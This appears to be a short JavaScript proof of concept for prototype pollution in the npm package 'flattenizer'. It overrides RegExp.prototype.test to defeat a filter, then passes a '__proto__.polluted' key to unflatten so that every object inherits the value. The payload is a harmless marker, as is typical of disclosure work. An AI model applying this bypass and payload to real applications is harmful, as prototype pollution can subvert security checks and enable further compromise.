RegExp.prototype.test = () => false;
console.log({}.polluted);
const flattenizer = require('flattenizer');
flattenizer.unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);